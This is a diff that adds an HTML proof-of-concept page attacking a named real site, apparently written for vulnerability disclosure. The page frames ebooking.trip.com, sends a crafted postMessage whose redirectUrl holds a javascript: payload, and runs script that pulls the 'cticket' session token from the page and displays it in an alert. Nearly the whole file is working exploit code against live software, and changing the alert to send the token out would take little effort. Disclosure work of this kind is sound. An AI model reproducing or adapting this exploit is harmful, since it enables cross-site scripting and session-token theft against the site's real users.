@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trip.com eBooking PostMessage XSS PoC</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background-color: #f4f4f9;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        h2 { color: #d9534f; }
+        iframe {
+            width: 100%;
+            height: 500px;
+            border: 2px solid #ccc;
+            border-radius: 4px;
+            margin-top: 15px;
+        }
+        .status {
+            font-weight: bold;
+            color: #0275d8;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Exploit Demonstration: PostMessage XSS & Token Extraction</h2>
+    <div class="status" id="status-text">Status: Waiting for eBooking frame to load...</div>
+    
+    <!-- Target subdomain is framed directly to the vulnerable component path -->
+    <iframe id="target-frame" src="https://ebooking.trip.com/promotion/proList"></iframe>
+</div>
+
+<script>
+    const targetFrame = document.getElementById('target-frame');
+    const statusText = document.getElementById('status-text');
+
+    // Wait for the target eBooking iframe to finish loading
+    targetFrame.addEventListener('load', () => {
+        statusText.innerText = "Status: Frame loaded. Injecting PostMessage payload...";
+        console.log("Target frame loaded. Sending payload...");
+
+        // This script executes inside the context of ebooking.trip.com via the iframe src sink
+        const alertScript = `javascript:(function(){
+            const pageSource = document.documentElement.innerHTML;
+            
+            // Regex to locate the cticket value within the DOM / Page Source
+            const match = pageSource.match(/cticket\\s*[:=]\\s*["']([^"']+)["']/);
+            
+            // Fallback definitions in case it is tied to window or an element ID
+            const token = match ? match[1] : (window.cticket || document.getElementById('cticket')?.value);
+            
+            if (token) {
+                alert("SUCCESS! DOM-Leaked Session Token Extracted!\\n\\nOrigin: " + document.domain + "\\n\\nExtracted cticket:\\n" + token);
+            } else {
+                alert("XSS Executed successfully on " + document.domain + "!\\n\\nNote: The cticket pattern was not found in this specific DOM state, but code execution is verified.");
+            }
+        })()`;
+
+        // Match the specific messageType structure expected by the app's listener
+        const payload = {
+            messageType: "pushSecurityVerify",
+            redirectUrl: alertScript
+        };
+
+        // Fire the cross-document message bypassing origin restriction via '*'
+        targetFrame.contentWindow.postMessage(payload, '*');
+        statusText.innerText = "Status: Payload sent successfully!";
+    });
+</script>
+
+</body>
+</html>
